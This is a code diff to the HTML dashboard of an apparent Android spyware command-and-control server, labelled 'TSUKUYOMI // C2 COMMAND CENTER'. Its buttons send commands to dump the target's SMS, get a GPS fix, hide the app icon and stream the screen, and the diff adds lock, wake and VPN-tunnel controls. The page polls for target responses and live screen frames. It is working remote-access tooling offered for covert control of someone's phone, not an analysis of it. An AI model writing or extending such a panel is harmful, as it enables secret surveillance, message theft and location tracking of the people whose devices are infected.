@@ -29,9 +29,9 @@ HTML_TEMPLATE = """
     <header class="w-full max-w-5xl glass-panel p-4 rounded-2xl mb-6 flex justify-between items-center shadow-lg">
         <div>
             <h1 class="font-bold text-base md:text-lg text-white tracking-wider">TSUKUYOMI // C2 COMMAND CENTER</h1>
-            <p class="text-xs text-slate-400">Status: <span class="text-green-400 font-semibold">ONLINE (FASTAPI FAST)</span></p>
+            <p class="text-xs text-slate-400">Status: <span class="text-green-400 font-semibold">ONLINE (ULTIMATE EDITION)</span></p>
         </div>
-        <div class="px-3 py-1 bg-cyan-500/10 text-cyan-400 border border-cyan-500/30 rounded-lg text-xs font-mono">TARGET: ACTIVE</div>
+        <div class="px-3 py-1 bg-cyan-500/10 text-cyan-400 border border-cyan-500/30 rounded-lg text-xs font-mono">TARGET: SECURE TUNNEL</div>
     </header>
 
     <!-- Main Workspace -->
@@ -53,7 +53,7 @@ HTML_TEMPLATE = """
         <div class="md:col-span-7 glass-panel p-4 rounded-2xl flex flex-col space-y-4">
             <h3 class="text-xs font-bold font-mono uppercase text-slate-300 tracking-wide">Command Dispatcher & Terminal</h3>
             
-            <!-- Quick Feature Buttons Grid -->
+            <!-- Quick Feature & Power Buttons Grid -->
             <div class="grid grid-cols-3 gap-2">
                 <button onclick="sendCmd('FLASH_ON')" class="p-2.5 bg-slate-900 hover:bg-slate-800 border border-slate-700/80 rounded-xl text-xs text-amber-400 font-medium transition">🔦 Flash ON</button>
                 <button onclick="sendCmd('FLASH_OFF')" class="p-2.5 bg-slate-900 hover:bg-slate-800 border border-slate-700/80 rounded-xl text-xs text-slate-300 font-medium transition">🔦 Flash OFF</button>
@@ -61,6 +61,9 @@ HTML_TEMPLATE = """
                 <button onclick="sendCmd('GPS')" class="p-2.5 bg-slate-900 hover:bg-slate-800 border border-slate-700/80 rounded-xl text-xs text-rose-400 font-medium transition">📍 GPS Fix</button>
                 <button onclick="sendCmd('DUMP_SMS')" class="p-2.5 bg-slate-900 hover:bg-slate-800 border border-slate-700/80 rounded-xl text-xs text-green-400 font-medium transition">📨 Dump SMS</button>
                 <button onclick="sendCmd('STEALTH_ON')" class="p-2.5 bg-slate-900 hover:bg-slate-800 border border-slate-700/80 rounded-xl text-xs text-purple-400 font-medium transition">🥷 Hide Icon</button>
+                <button onclick="sendCmd('LOCK_PHONE')" class="p-2.5 bg-slate-900 hover:bg-slate-800 border border-slate-700/80 rounded-xl text-xs text-red-400 font-medium transition">🔒 Lock Device</button>
+                <button onclick="sendCmd('WAKE_PHONE')" class="p-2.5 bg-slate-900 hover:bg-slate-800 border border-slate-700/80 rounded-xl text-xs text-teal-300 font-medium transition">🔓 Wake Screen</button>
+                <button onclick="sendCmd('VPN_TOGGLE')" class="p-2.5 bg-slate-900 hover:bg-slate-800 border border-slate-700/80 rounded-xl text-xs text-blue-400 font-medium transition">🛡️ VPN Tunnel</button>
             </div>
 
             <!-- Custom Command Input Bar -->
@@ -70,7 +73,7 @@ HTML_TEMPLATE = """
             </div>
 
             <!-- Real-time Terminal Log Box -->
-            <div class="log" id="logBox">[SYSTEM] FastAPI C2 Dashboard active and polling...</div>
+            <div class="log" id="logBox">[SYSTEM] Ultimate FastAPI C2 Dashboard active...</div>
         </div>
     </main>
 
@@ -99,7 +102,6 @@ HTML_TEMPLATE = """
 
         async function pollData() {
             try {
-                // Fetch target response logs
                 let res = await fetch('/api/response');
                 let data = await res.json();
                 if(data.response && data.response !== window.lastResp) {
@@ -107,7 +109,6 @@ HTML_TEMPLATE = """
                     log("[TARGET] " + data.response);
                 }
 
-                // Fetch live screen streaming frames
                 let screenRes = await fetch('/api/screen');
                 let screenData = await screenRes.json();
                 if(screenData.frame) {
@@ -116,8 +117,7 @@ HTML_TEMPLATE = """
             } catch(e) {}
         }
         
-        // Ultra-fast 500ms sync poll interval for smooth millisecond feel
-        setInterval(pollData, 500);
+        setInterval(pollData, 500); // 500ms ultra-fast poll
 
         function log(msg) {
             let box = document.getElementById('logBox');
